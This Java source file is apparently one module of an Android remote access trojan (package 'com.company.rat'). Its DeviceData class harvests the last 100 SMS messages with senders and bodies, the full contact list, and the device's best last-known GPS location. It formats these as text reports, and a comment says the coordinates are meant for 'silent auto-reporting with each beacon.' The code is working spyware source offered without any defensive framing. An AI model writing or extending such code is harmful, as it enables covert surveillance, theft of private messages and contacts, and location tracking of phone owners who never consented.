package com.company.rat;

import android.annotation.SuppressLint;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.net.Uri;
import android.provider.ContactsContract;
import android.util.Log;

/**
 * Reads SMS, contacts, and last known GPS location.
 * All read-only — no data is modified.
 */
public class DeviceData {

    private static final String TAG = "DeviceData";

    // ── SMS ───────────────────────────────────────────────────────────────────

    public static String readSms(Context ctx) {
        StringBuilder sb = new StringBuilder("=== SMS INBOX ===\n\n");
        Uri smsUri = Uri.parse("content://sms/inbox");
        String[] cols = {"address", "date", "body"};
        try (Cursor c = ctx.getContentResolver().query(
                smsUri, cols, null, null, "date DESC LIMIT 100")) {
            if (c == null) return "SMS: no access\n";
            while (c.moveToNext()) {
                String from = c.getString(0);
                long   date = c.getLong(1);
                String body = c.getString(2);
                sb.append("FROM: ").append(from).append("\n")
                  .append("DATE: ").append(new java.util.Date(date)).append("\n")
                  .append("BODY: ").append(body).append("\n")
                  .append("---\n");
            }
        } catch (Exception e) {
            Log.w(TAG, "sms error", e);
            sb.append("error: ").append(e.getMessage());
        }
        return sb.toString();
    }

    // ── Contacts ──────────────────────────────────────────────────────────────

    public static String readContacts(Context ctx) {
        StringBuilder sb = new StringBuilder("=== CONTACTS ===\n\n");
        String[] cols = {
            ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
            ContactsContract.CommonDataKinds.Phone.NUMBER
        };
        try (Cursor c = ctx.getContentResolver().query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                cols, null, null,
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC")) {
            if (c == null) return "Contacts: no access\n";
            while (c.moveToNext()) {
                String name  = c.getString(0);
                String phone = c.getString(1);
                sb.append(name).append("  ").append(phone).append("\n");
            }
        } catch (Exception e) {
            Log.w(TAG, "contacts error", e);
            sb.append("error: ").append(e.getMessage());
        }
        return sb.toString();
    }

    // ── Location ──────────────────────────────────────────────────────────────

    @SuppressLint("MissingPermission")
    public static String lastLocation(Context ctx) {
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        if (lm == null) return "location: no LocationManager";

        Location best = null;
        for (String provider : new String[]{
                LocationManager.GPS_PROVIDER,
                LocationManager.NETWORK_PROVIDER,
                LocationManager.PASSIVE_PROVIDER}) {
            try {
                Location loc = lm.getLastKnownLocation(provider);
                if (loc != null) {
                    if (best == null || loc.getAccuracy() < best.getAccuracy())
                        best = loc;
                }
            } catch (Exception e) {
                Log.w(TAG, "loc provider " + provider + ": " + e.getMessage());
            }
        }

        if (best == null) return "location: no cached location available";

        return "=== LOCATION ===\n"
             + "lat=" + best.getLatitude() + "\n"
             + "lon=" + best.getLongitude() + "\n"
             + "acc=" + best.getAccuracy() + "m\n"
             + "provider=" + best.getProvider() + "\n"
             + "time=" + new java.util.Date(best.getTime()) + "\n"
             + "maps=https://maps.google.com/?q="
             + best.getLatitude() + "," + best.getLongitude() + "\n";
    }

    /** Returns "lat,lon,acc" for silent auto-reporting with each beacon, or null if unavailable. */
    @SuppressLint("MissingPermission")
    public static String getCoords(Context ctx) {
        LocationManager lm = (LocationManager) ctx.getSystemService(Context.LOCATION_SERVICE);
        if (lm == null) return null;
        Location best = null;
        for (String p : new String[]{LocationManager.GPS_PROVIDER, LocationManager.NETWORK_PROVIDER, LocationManager.PASSIVE_PROVIDER}) {
            try {
                Location loc = lm.getLastKnownLocation(p);
                if (loc != null && (best == null || loc.getAccuracy() < best.getAccuracy()))
                    best = loc;
            } catch (Exception ignored) {}
        }
        if (best == null) return null;
        return best.getLatitude() + "," + best.getLongitude() + "," + (int) best.getAccuracy();
    }
}
